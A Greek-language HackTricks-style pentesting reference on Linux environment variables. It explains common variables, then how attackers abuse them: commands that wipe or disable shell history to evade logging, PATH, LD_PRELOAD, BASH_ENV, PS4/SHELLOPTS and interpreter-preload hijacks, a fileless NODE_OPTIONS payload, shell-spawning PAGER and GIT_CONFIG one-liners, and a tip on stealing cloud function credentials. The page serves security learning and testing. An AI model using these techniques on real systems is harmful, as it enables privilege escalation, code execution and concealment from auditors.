# Μεταβλητές περιβάλλοντος Linux

{{#include ../../banners/hacktricks-training.md}}

## Καθολικές μεταβλητές

Οι καθολικές μεταβλητές **θα** κληρονομούνται από τις **child processes**.

Μπορείτε να δημιουργήσετε μια καθολική μεταβλητή για την τρέχουσα συνεδρία σας εκτελώντας:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Αυτή η μεταβλητή θα είναι προσβάσιμη από τις τρέχουσες συνεδρίες σας και τις θυγατρικές διεργασίες τους.

Μπορείτε να **αφαιρέσετε** μια μεταβλητή εκτελώντας:
```bash
unset MYGLOBAL
```
## Τοπικές μεταβλητές

Οι **τοπικές μεταβλητές** μπορούν να **προσπελαστούν** μόνο από το **τρέχον shell/script**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Λίστα τρεχουσών μεταβλητών
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Τα περιεχόμενα του `/proc/*/environ` διαχωρίζονται με **NUL**, επομένως αυτές οι παραλλαγές είναι συνήθως πιο εύκολες στην ανάγνωση:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Αν αναζητάτε **credentials** ή **ενδιαφέρουσες ρυθμίσεις υπηρεσιών** μέσα σε inherited environments, ελέγξτε επίσης το [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Κοινές μεταβλητές

Από: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – η οθόνη που χρησιμοποιείται από το **X**. Αυτή η μεταβλητή συνήθως ορίζεται σε **:0.0**, που σημαίνει την πρώτη οθόνη στον τρέχοντα υπολογιστή.
- **EDITOR** – ο προτιμώμενος επεξεργαστής κειμένου του χρήστη.
- **HISTFILESIZE** – ο μέγιστος αριθμός γραμμών που περιέχονται στο αρχείο ιστορικού.
- **HISTSIZE** – ο αριθμός γραμμών που προστίθενται στο αρχείο ιστορικού όταν ο χρήστης ολοκληρώνει τη συνεδρία του.
- **HOME** – ο προσωπικός σας κατάλογος.
- **HOSTNAME** – το hostname του υπολογιστή.
- **LANG** – η τρέχουσα γλώσσα σας.
- **MAIL** – η τοποθεσία του mail spool του χρήστη. Συνήθως **/var/spool/mail/USER**.
- **MANPATH** – η λίστα καταλόγων στους οποίους γίνεται αναζήτηση για manual pages.
- **OSTYPE** – ο τύπος του λειτουργικού συστήματος.
- **PS1** – το προεπιλεγμένο prompt στο bash.
- **PATH** – αποθηκεύει τη διαδρομή όλων των καταλόγων που περιέχουν binary files τα οποία θέλετε να εκτελέσετε, καθορίζοντας απλώς το όνομα του αρχείου και όχι relative ή absolute path.
- **PWD** – ο τρέχων working directory.
- **SHELL** – το path προς το τρέχον command shell (για παράδειγμα, **/bin/bash**).
- **TERM** – ο τρέχων τύπος terminal (για παράδειγμα, **xterm**).
- **TZ** – η ζώνη ώρας σας.
- **USER** – το τρέχον username σας.

## Ενδιαφέρουσες μεταβλητές για hacking

Δεν είναι όλες οι μεταβλητές εξίσου χρήσιμες. Από offensive perspective, δώστε προτεραιότητα σε μεταβλητές που αλλάζουν **search paths**, **startup files**, τη **dynamic linker behavior** ή το **audit/logging**.

### **HISTFILESIZE**

Αλλάξτε την **τιμή αυτής της μεταβλητής σε 0**, ώστε όταν **τερματίσετε τη συνεδρία σας** το **αρχείο ιστορικού** (\~/.bash_history) να **περικοπεί σε 0 γραμμές**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Αλλάξτε την **τιμή αυτής της μεταβλητής σε 0**, ώστε οι εντολές **να μην διατηρούνται στο ιστορικό που βρίσκεται στη μνήμη** και να μην εγγράφονται στο **αρχείο ιστορικού** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Αν η **τιμή αυτής της μεταβλητής έχει οριστεί σε `ignorespace` ή `ignoreboth`**, οποιαδήποτε εντολή που έχει προστεθεί με ένα επιπλέον κενό στην αρχή δεν θα αποθηκεύεται στο ιστορικό.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Κατευθύνετε το **history file** στο **`/dev/null`** ή καταργήστε το εντελώς. Αυτό είναι συνήθως πιο αξιόπιστο από την απλή αλλαγή του μεγέθους του history.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Οι διεργασίες θα χρησιμοποιούν το **proxy** που δηλώνεται εδώ για να συνδεθούν στο internet μέσω **http ή https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: προεπιλεγμένος proxy για εργαλεία/πρωτόκολλα που τον υποστηρίζουν.
- `no_proxy`: λίστα παράκαμψης (hosts/domains/CIDRs) που θα πρέπει να συνδέονται απευθείας.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Μπορούν να χρησιμοποιηθούν τόσο πεζές όσο και κεφαλαίες παραλλαγές, ανάλογα με το tool (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Οι διεργασίες θα εμπιστεύονται τα πιστοποιητικά που υποδεικνύονται σε **αυτές τις env variables**. Αυτό είναι χρήσιμο για να κάνουν tools όπως τα **`curl`**, **`git`**, οι HTTP clients της Python ή οι package managers να εμπιστεύονται ένα CA που ελέγχεται από τον attacker (για παράδειγμα, ώστε ένα interception proxy να φαίνεται νόμιμο).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Αν ένα privileged wrapper/script εκτελεί commands **χωρίς absolute paths**, κερδίζει ο **πρώτος attacker-controlled κατάλογος** στο `PATH`. Αυτό είναι το primitive πίσω από πολλά **PATH hijacks** σε `sudo`, cron jobs, shell wrappers και custom SUID helpers. Αναζήτησε `env_keep+=PATH`, αδύναμο `secure_path` ή wrappers που καλούν τα `tar`, `service`, `cp`, `python` κ.λπ. με το όνομά τους.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Για πλήρεις αλυσίδες privilege-escalation που κάνουν abuse στο `PATH`, δείτε το [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

Το `HOME` δεν είναι μόνο αναφορά σε directory: πολλά εργαλεία φορτώνουν αυτόματα **dotfiles**, **plugins** και **per-user configuration** από τα `$HOME` ή `$XDG_CONFIG_HOME`. Αν ένα privileged workflow διατηρεί αυτές τις τιμές, το **config injection** μπορεί να είναι ευκολότερο από το binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Ενδιαφέροντες στόχοι περιλαμβάνουν τα `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` και αρχεία ειδικά για εργαλεία, όπως το `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Αυτές οι μεταβλητές επηρεάζουν τον **dynamic linker**:

- `LD_PRELOAD`: επιβάλλει τη φόρτωση επιπλέον shared objects πρώτα.
- `LD_LIBRARY_PATH`: προσθέτει στην αρχή καταλόγους αναζήτησης βιβλιοθηκών.
- `LD_AUDIT`: φορτώνει auditor libraries που παρακολουθούν τη φόρτωση βιβλιοθηκών και την επίλυση συμβόλων.

Είναι εξαιρετικά χρήσιμες για **hooking**, **instrumentation** και **privilege escalation**, εάν μια privileged εντολή τις διατηρεί. Σε λειτουργία **secure-execution** (`AT_SECURE`, π.χ. setuid/setgid/capabilities), ο loader αφαιρεί ή περιορίζει πολλές από αυτές τις μεταβλητές. Ωστόσο, parser bugs σε αυτό το πρώιμο στάδιο του loader εξακολουθούν να έχουν σημαντικό αντίκτυπο, επειδή εκτελούνται **πριν** από το target program.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

Το `GLIBC_TUNABLES` αλλάζει τη συμπεριφορά του glibc σε πρώιμο στάδιο (για παράδειγμα, τα allocator tunables) και είναι πολύ χρήσιμο σε exploit labs. Έχει επίσης σημασία από την άποψη της ασφάλειας, επειδή ο **dynamic loader το αναλύει σε πολύ πρώιμο στάδιο**. Το bug **Looney Tunables** του 2023 ήταν μια καλή υπενθύμιση ότι μία μόνο μεταβλητή περιβάλλοντος που αναλύεται από τον loader μπορεί να μετατραπεί σε **primitive για local privilege escalation** εναντίον προγραμμάτων SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Αν το **Bash** εκκινηθεί **μη διαδραστικά**, ελέγχει το `BASH_ENV` και φορτώνει αυτό το αρχείο πριν εκτελέσει το target script. Όταν το Bash καλείται ως `sh` ή σε διαδραστική λειτουργία τύπου POSIX, μπορεί να ελεγχθεί και το `ENV`. Αυτός είναι ένας κλασικός τρόπος για να μετατραπεί ένα shell wrapper σε code execution, αν το environment ελέγχεται από τον attacker.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Το Bash αγνοεί αυτά τα αρχεία εκκίνησης όταν τα **πραγματικά/ενεργά IDs διαφέρουν**· το `-p` διατηρεί το ενεργό ID, αλλά δεν ενεργοποιεί αυτά τα αρχεία εκκίνησης, επομένως η ακριβής συμπεριφορά εξαρτάται από τον τρόπο με τον οποίο το wrapper εκκινεί το shell. Να είστε προσεκτικοί με privileged wrappers που καλούν `setuid()`/`setgid()` **πριν** από την εκκίνηση του Bash: μόλις τα IDs ταιριάξουν ξανά, το Bash μπορεί να εμπιστευτεί τα `BASH_ENV`, `ENV` και τη σχετική κατάσταση του shell, τα οποία διαφορετικά θα αγνοούσε.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Όταν το Bash εκτελείται με ενεργοποιημένο το **xtrace**, κάνει expand το `PS4` και το εμφανίζει πριν από κάθε traced command. Το `PS4` γίνεται expand όπως ένα prompt, επομένως ένα **command substitution** μέσα σε αυτό εκτελείται. Το κρίσιμο είναι ότι το xtrace μπορεί να ενεργοποιηθεί αποκλειστικά από το περιβάλλον με την εξαγωγή του `SHELLOPTS=xtrace` — δεν απαιτείται `-x` στη γραμμή εντολών — επομένως οποιοδήποτε Bash script εκτελεί το θύμα γίνεται code execution.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
Το `PS4` δεν κάνει τίποτα μέχρι να ενεργοποιηθεί το xtrace (`SHELLOPTS=xtrace`, `set -x` ή `bash -x`), και το Bash αφαιρεί το `SHELLOPTS` σε privileged/setuid contexts, όπως και το `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONBREAKPOINT**

Αυτές οι μεταβλητές αλλάζουν τον τρόπο εκκίνησης της Python:

- `PYTHONPATH`: προσθέτει στην αρχή paths αναζήτησης για imports.
- `PYTHONHOME`: μετακινεί το δέντρο της standard library.
- `PYTHONSTARTUP`: εκτελεί ένα αρχείο πριν από το interactive prompt.
- `PYTHONINSPECT=1`: μεταβαίνει σε interactive mode μετά την ολοκλήρωση ενός script.
- `PYTHONBREAKPOINT`: καλεί το `package.module.callable` (και κάνει import το module του) όταν ο κώδικας φτάσει στο `breakpoint()`.<sup>[[8]](#references)</sup>

Είναι χρήσιμες απέναντι σε maintenance scripts, debuggers, shells και wrappers που καλούν την Python με environment που μπορεί να ελεγχθεί. Τα `python -E` και `python -I` αγνοούν όλες τις μεταβλητές `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Ένα πρόσφατο παράδειγμα από τον πραγματικό κόσμο ήταν το LPE του **needrestart** το 2024 σε συστήματα Ubuntu/Debian: ο scanner που εκτελούνταν ως root αντέγραφε το `PYTHONPATH` μιας unprivileged διεργασίας από το `/proc/<PID>/environ` και στη συνέχεια εκτελούσε Python. Το δημοσιευμένο exploit τοποθετούσε το `importlib/__init__.so` στη διαδρομή που ελεγχόταν από τον attacker, ώστε η Python να εκτελέσει κώδικα του attacker κατά τη δική της αρχικοποίηση, πριν ακόμη έχει σημασία το hard-coded script του helper.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Η Perl διαθέτει εξίσου χρήσιμες μεταβλητές εκκίνησης:

- `PERL5LIB`: προσθέτει καταλόγους βιβλιοθηκών στην αρχή της λίστας.
- `PERL5OPT`: εισάγει switches σαν να υπήρχαν σε κάθε command line της `perl`.

Αυτό μπορεί να επιβάλει **automatic module loading** ή να αλλάξει τη συμπεριφορά του interpreter πριν το target script εκτελέσει οτιδήποτε ενδιαφέρον. Η Perl αγνοεί αυτές τις μεταβλητές σε περιβάλλοντα **taint / setuid / setgid**, αλλά εξακολουθούν να έχουν μεγάλη σημασία για συνηθισμένα wrappers που εκτελούνται ως root, CI jobs, installers και custom sudoers rules.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

Το `NODE_OPTIONS` προσαρτά **Node.js CLI flags** σε κάθε διεργασία `node` που κληρονομεί το περιβάλλον. Αυτό το καθιστά χρήσιμο εναντίον wrappers, CI jobs, Electron helpers και sudo rules που τελικά εκτελούν Node. Τα πιο ενδιαφέροντα flags από επιθετική άποψη είναι συνήθως:

- `--require <file>`: προφορτώνει ένα αρχείο CommonJS πριν από το target script.
- `--import <module>`: προφορτώνει ένα ES module πριν από το target script.

Το Node απορρίπτει ορισμένα επικίνδυνα flags στο `NODE_OPTIONS`, αλλά τα `--require` και `--import` επιτρέπονται ρητά και υποβάλλονται σε επεξεργασία **πριν** από τα κανονικά command-line arguments.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Fileless preload με URL `data:`

Όταν μπορείτε να ορίσετε το `NODE_OPTIONS` αλλά **δεν μπορείτε να γράψετε ένα αρχείο** στον στόχο (σύστημα αρχείων μόνο για ανάγνωση, περιορισμένο API, serverless runtime κ.λπ.), το `--import` δέχεται ένα URL `data:text/javascript,`, έτσι ώστε ολόκληρο το payload να μεταφέρεται μέσα στην ίδια τη μεταβλητή περιβάλλοντος. Η JavaScript πρέπει να είναι **πλήρως κωδικοποιημένη σε URL** — το Node αναλύει την τιμή ως URL, επομένως οποιοδήποτε μη κωδικοποιημένο κενό (ή άλλος χαρακτήρας) περικόπτει το payload και προκαλεί `SyntaxError`. Αυτό λειτουργεί σε Node 20.6+ όπου το `--import` βρίσκεται στη λίστα επιτρεπόμενων επιλογών του `NODE_OPTIONS`.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Αυτός είναι ένας συνηθισμένος τρόπος για τη μετατροπή του ελέγχου του `NODE_OPTIONS` σε RCE σε **managed cloud runtimes**, των οποίων οι functions εκτελούνται σε Node. Για παράδειγμα, ένας attacker που μπορεί να αλλάξει μόνο τη διαμόρφωση ενός Lambda (`lambda:UpdateFunctionConfiguration`, χωρίς `iam:PassRole` και χωρίς ενημέρωση κώδικα) μπορεί να εισαγάγει `NODE_OPTIONS=--import data:text/javascript,<payload>` για να εκτελέσει κώδικα μέσα στη function και να κλέψει τα διαπιστευτήρια του execution role. Το injected module εκτελείται **πριν** από τον handler, ο οποίος στη συνέχεια εκτελείται κανονικά.

Για remote gadget chains που ορίζουν έμμεσα το `NODE_OPTIONS` (για παράδειγμα, μέσω prototype-pollution to RCE), δείτε [αυτήν τη σελίδα](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Η Ruby προσφέρει την ίδια κατηγορία startup abuse:

- `RUBYLIB`: προσθέτει καταλόγους στην αρχή του load path της Ruby.
- `RUBYOPT`: εισάγει command-line options, όπως το `-r`, σε κάθε invocation του `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Οι ευπάθειες του **needrestart** του 2024 έδειξαν ότι αυτό δεν είναι απλώς ένα εργαστηριακό τέχνασμα: το ίδιο root-owned helper που ήταν ευάλωτο σε κατάχρηση του `PYTHONPATH` μπορούσε επίσης να εξαναγκαστεί να εκτελέσει Ruby με ένα `RUBYLIB` ελεγχόμενο από attacker, φορτώνοντας το `enc/encdb.so` από έναν κατάλογο του attacker.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Τα Vim/Neovim εκτελούν τις Ex commands που περιέχονται στο `VIMINIT` (ή στο fallback `EXINIT`) κατά την κανονική εκκίνηση. Οι Ex commands περιλαμβάνουν τα `:!cmd` και `:call system(...)`, επομένως ο έλεγχος της μεταβλητής επιτρέπει την εκτέλεση κώδικα κάθε φορά που ένα θύμα ανοίγει το Vim (`sudo vim` ως root, `crontab -e`, `visudo`, `git`/`less` που εκκινούν το `$EDITOR` κ.λπ.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Η λειτουργία batch (`vim -es`/`-Es`) παραλείπει αυτές τις μεταβλητές, αλλά μια κανονική interactive εκκίνηση τις εκτελεί.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

Το PowerShell Core (`pwsh`) εκτελείται σε Linux/macOS (και Windows) και είναι μια **.NET εφαρμογή**, επομένως αρκετές environment variables μετατρέπουν οποιαδήποτε invocation του `pwsh` με inherited environment σε code execution — χρήσιμο εναντίον cron/systemd jobs, CI runners και privileged wrappers που κάνουν shell out σε `pwsh`.

- `PSModulePath`: Το PowerShell αναζητά recursively σε κάθε directory αυτής της λίστας για modules `.psd1`/`.psm1` και κάνει **auto-load** ενός module την πρώτη φορά που γίνεται reference σε command που αυτό εξάγει. Κάντε prepend ένα directory και ο top-level κώδικας του module σας εκτελείται κατά το import· επειδή η επίλυση γίνεται με τη σειρά *Alias → Function → Cmdlet*, μια exported function μπορεί ακόμη και να κάνει shadow ένα built-in cmdlet που καλεί το victim.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: Μετακινεί το `powershell/Microsoft.PowerShell_profile.ps1`, το οποίο εκτελείται κατά την εκκίνηση (εκτός αν χρησιμοποιείται το `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: managed assembly του οποίου το `StartupHook.Initialize()` εκτελείται πριν από το `Main` (κοινό για κάθε .NET app).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: Το CLR profiling API φορτώνει μια attacker library στη process κατά την εκκίνηση (τα path vars υπερισχύουν του registry· το `DOTNET_*` είναι το νεότερο alias). Στο Windows PowerShell 5.1 (.NET Framework) χρησιμοποιήστε `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Στα Windows, το `PSExecutionPolicyPreference=Bypass` αφαιρεί επιπλέον το προστατευτικό μέτρο «blocked unsigned scripts», ώστε ένα planted profile/module να εκτελείται πραγματικά. Δείτε την dedicated σελίδα για πλήρη PoCs:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Ορισμένα εργαλεία δεν διαβάζουν απλώς ένα path από το environment· προωθούν την τιμή σε ένα **shell**, έναν **editor** ή έναν **input preprocessor**. Αυτό καθιστά τις παρακάτω μεταβλητές ιδιαίτερα ενδιαφέρουσες όταν ένα privileged wrapper εκτελεί τα `git`, `man`, `less` ή παρόμοια text viewers:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: επιλέγουν την εντολή του pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: επιλέγουν την εντολή του editor, συχνά μαζί με arguments.
- `LESSOPEN`, `LESSCLOSE`: ορίζουν pre/post-processors που εκτελούνται όταν το `less` ανοίγει ένα αρχείο.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Το Git υποστηρίζει επίσης **έγχυση ρυθμίσεων μόνο μέσω μεταβλητών περιβάλλοντος** χωρίς να αγγίζει τον δίσκο, μέσω των `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` και `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Από την οπτική του post-exploitation, να θυμάστε επίσης ότι τα κληρονομημένα περιβάλλοντα συχνά περιέχουν **διαπιστευτήρια**, **ρυθμίσεις proxy**, **service tokens** ή **cloud keys**. Ελέγξτε το [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) για το `/proc/<PID>/environ` και το hunting του `systemd` `Environment=`.

### PS1

Αλλάξτε την εμφάνιση του prompt σας.

[**Αυτό είναι ένα παράδειγμα**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Αυτό είναι ένα παράδειγμα](<../images/image (897).png>)

Κανονικός χρήστης:

![PERL5OPT & PERL5LIB - PS1: Μία, δύο και τρεις εργασίες στο background](<../images/image (740).png>)

Μία, δύο και τρεις εργασίες στο background:

![PERL5OPT & PERL5LIB - PS1: Μία, δύο και τρεις εργασίες στο background](<../images/image (145).png>)

Μία εργασία στο background, μία σταματημένη και η τελευταία εντολή δεν ολοκληρώθηκε σωστά:

![PERL5OPT & PERL5LIB - PS1: Μία εργασία στο background, μία σταματημένη και η τελευταία εντολή δεν ολοκληρώθηκε σωστά](<../images/image (715).png>)

## References

- [1] [Εγχειρίδιο GNU Bash - Αρχεία εκκίνησης του Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs στο needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Τεκμηρίωση Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Συνηθισμένες μεταβλητές περιβάλλοντος - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation στο ld.so του glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Εγχειρίδιο GNU Bash - Μεταβλητές Bash (`PS4`) και το ενσωματωμένο Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Ενσωματωμένο breakpoint() και PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Τεκμηρίωση Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath και αυτόματη φόρτωση modules του PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Ρυθμίσεις config για debugging και profiling του .NET (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
